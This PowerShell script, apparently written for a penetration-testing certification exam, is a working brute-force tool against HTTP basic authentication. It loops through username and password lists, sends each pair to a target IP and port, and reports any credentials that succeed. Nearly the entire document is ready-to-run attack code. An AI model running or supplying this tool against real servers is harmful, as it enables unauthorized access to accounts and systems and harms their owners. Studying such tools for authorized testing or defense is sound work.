


function Invoke-Brute-BasicAuth 

<#

.SYNOPSIS
Brute Force basic authentication

.DESCRIPTION

Brute Force basic authentication using either a word list or single password or name .
     
.EXAMPLE

PS C:\>. .\Invoke-Brute-BasicAuth
PS C:\>Invoke-Brute-BasicAuth -IP 192.168.111.113 -port 80 -UserNameList C:\usernamlist.txt -Password c:\passwordlist.txt


.LINK
https://en.wikipedia.org/wiki/Basic_access_authentication
https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1
https://www.digitalocean.com/community/tutorials/how-to-set-up-password-authentication-with-apache-on-ubuntu-16-04



.NOTES

Student ID : NONE
This blog post has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam: http://www.securitytube-training.com/onlinecourses/powershell-for-pentesters/


#> 






{
    [CmdletBinding()]
    param
    (

    [Parameter (Mandatory=$true, Position = 0)]
    [string]
    $IP,

    [Parameter (Mandatory=$true, Position = 1)]
    [string]
    $port,

    [Parameter (Mandatory=$false, Position = 2)]
    [string]
    $UserName,

    [Parameter (Mandatory=$false, Position = 3)]
    [string]
    $UserNameList = "",

    [Parameter (Mandatory=$false, Position = 4)]
    [string]
    $Password,

    [Parameter (Mandatory=$false, Position = 5)]
    [string]
    $PasswordList = ""



    )

    if ($Password)
    {
        #setting single password from input
        $Passwords = $Password
        write-host   "Brute forcing single password : $Password "
    }

    elseif($PasswordList)
    {
        #setting the passwords from dict
        $Passwords = Get-Content $PasswordList
        write-host  "Brute forcing using passwords in  : $PasswordList "
    }

    else
    {
        write-host -ForegroundColor red -BackgroundColor black "one of Passwords options must be specified"
        break
    }

    if ($UserName)
    {
         #setting single username from input
        $UserNames = $UserName
        write-host   "Brute forcing single user : $username "
        
    }

    elseif($UserNameList)
    {
        #setting the usernames from dict
        $UserNames = Get-Content $UserNameList
        write-host   "Brute forcing usernames in  : $UserNameList "
    }

    else
    {
        write-host -ForegroundColor red -BackgroundColor black "One of usernames option must be specified"
        break
    }


    #buliding the url 
    $url = "http://" + $IP + ":" +$port
    write-host
    
    

    #loop to try every username with every password in case of username dict provided and password dict
    foreach ($user in $Usernames)
    {
        foreach ($pass in $Passwords)
        {
            # Creating url for request
            $req = [system.Net.WebRequest]::Create($url)
            $req.Timeout=10000
            #buliding Credentials for Basic authentication
            $Auth= [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$user"+":"+"$pass"))
            #adding Basic authentication header
            $req.Headers.add('Authorization','Basic '+$Auth)
            try
            {
                # printing the username and password to try
                Write-Host  "$user :  $pass"
                #getting the respone from the remote server or target
                $res = $req.GetResponse()
                Write-Host "=============================================="
                #flag to make it work like switch when username and password is correct
                $Flag=$true
                if ($Flag)
                {
                    Write-Host -ForegroundColor Green  "Creds Found $user :  $pass "
                }

            }

            catch
            {
                $flag=$false
            }
        
    }

    


}
    # printing if no Creds was Found 
    if($flag  -eq $false)
    {
        Write-Host -ForegroundColor Red "Failed to Find Creds !!"
    }


}
